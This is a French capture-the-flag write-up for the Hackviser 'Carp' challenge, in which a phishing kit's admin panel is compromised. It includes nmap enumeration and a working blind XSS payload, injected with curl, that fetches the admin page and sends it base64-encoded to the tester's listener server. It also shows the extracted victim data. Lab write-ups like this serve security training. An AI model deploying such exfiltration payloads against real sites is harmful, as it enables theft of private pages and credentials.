# Write-up CTF : Carp (Hackviser)

**Difficulté :** Medium  
**Auteur :**   
**Catégorie :** Web / Phishing Investigation

---

## 1. Introduction

Le challenge **Carp** nous place dans la peau d'un analyste en cybersécurité enquêtant sur une campagne de phishing visant une entreprise. Nous disposons de l'URL du site malveillant : `http://officemailcentral.hv`. L'objectif est d'identifier l'attaquant et les victimes.

---

## 2. Reconnaissance (Énumération)

### Scan des ports (Nmap)

On commence par un scan classique pour identifier les services ouverts :

```bash
nmap -sV -T4 officemailcentral.hv
```

**Résultats :**

- `22/tcp` (SSH)
- `80/tcp` (HTTP) : Apache/2.4.56 (Debian)
- `3306/tcp` (MySQL)

### Énumération DNS et Web (Nuclei / Ffuf)

Nuclei et Ffuf révèlent plusieurs endpoints intéressants :

- `/index.php` : Page d'accueil (Portail de connexion imitant un service de messagerie).
- `/phpinfo.php` : Fuite d'informations système (Document root : `/var/www/html`).
- `/webadmin/` : Panneau d'administration redirigeant vers `login.php`.
- `/database/` : Dossier sensible contenant potentiellement des fichiers de configuration ou des logs.

---

## 3. Analyse de la surface d'attaque

### Le site de Phishing (`/index.php`)

Cette page demande un email et un mot de passe. Après soumission, elle redirige systématiquement vers `index.php?status=error`. C'est le comportement typique d'un "kit de phishing" qui enregistre les identifiants en base de données sans validation.

### Le Panneau d'Administration (`/webadmin/`)

Le panneau de l'attaquant est protégé par un login. Les tentatives d'injection SQL classiques (`' OR 1=1--`) et le bruteforce sur ce formulaire n'ont pas donné de résultats immédiats.

---

## 4. Exploitation : Blind XSS

### Théorie

Dans ce scénario, l'attaquant consulte son propre panneau d'administration pour voir les identifiants qu'il a volés. Si le panneau d'administration affiche les données saisies par les victimes sur la page de phishing sans les filtrer, nous pouvons injecter du JavaScript. Ce script sera exécuté dans le navigateur de l'attaquant (bot admin) lorsqu'il consultera les logs.

### Préparation du Payload

Nous voulons que le script récupère le contenu de la page d'administration et nous l'envoie.

**Payload JavaScript :**

```javascript
<script>
fetch('/webadmin/')
  .then(response => response.text())
  .then(data => {
    // Envoi des données encodées en Base64 à notre serveur d'écoute
    new Image().src = "http://<VOTRE_IP>:8082/?data=" + btoa(data);
  });
</script>
```

### Mise en place du Listener

On utilise Python pour écouter sur notre machine le port 8082 :

```bash
python3 -m http.server 8082
```

### Injection du Payload

On envoie le payload via une requête POST sur la page de phishing. On peut l'injecter dans le champ `email` ou `password` :

```bash
PAYLOAD="<script>fetch('/webadmin/').then(r=>r.text()).then(d=>{new Image().src='http://10.8.96.29:8082/?data='+btoa(d);});</script>"

curl -s -X POST http://officemailcentral.hv/index.php \
  --data-urlencode "email=victim@hegmannholdings.com" \
  --data-urlencode "password=$PAYLOAD"
```

---

## 5. Analyse des données volées

### Récupération du Panneau Admin

Après quelques secondes, le bot admin consulte la page et déclenche l'XSS. Notre serveur Python reçoit une requête GET contenant un énorme paramètre `data`.

**Extraction et décodage :**

1. On sauvegarde le Base64 reçu.
2. On le décode en HTML :

```bash
echo "BASE64_CODE" | base64 -d > admin_panel.html
```

### Extraction des réponses

En ouvrant ou en utilisant `grep` sur `admin_panel.html`, on découvre un tableau contenant les emails volés, les mots de passe, les IP et les dates.

1. **Email de l'employé de "Hegmann Holdings" :**
   `grep "hegmannholdings.com" admin_panel.html`
   > **Réponse :** `charyl.stallan@hegmannholdings.com`

2. **Date du vol des informations :**
   En regardant la ligne correspondante dans le tableau HTML :
   > **Réponse :** `2023-06-09`

3. **Domaines des autres entreprises victimes :**
   > **Réponse :** `innovatixcorp.com`, `astraltechsystems.com`, `fireflybox.com`, etc.

4. **IP de l'attaquant :**
   En bas du tableau, une entrée de test effectuée par l'attaquant révèle son IP :
   - Email : `test` / Pass : `test` / IP : `75.134.20.98`
   > **Réponse :** `75.134.20.98`

---

## 6. Conclusion

Ce challenge démontre l'efficacité des attaques **Out-of-Band (OOB)** comme la Blind XSS pour compromettre un panneau de contrôle inaccessible de l'extérieur. La faille résidait dans l'absence d'encodage des caractères HTML (`htmlspecialchars`) lors de l'affichage des logs capturés par le kit de phishing.
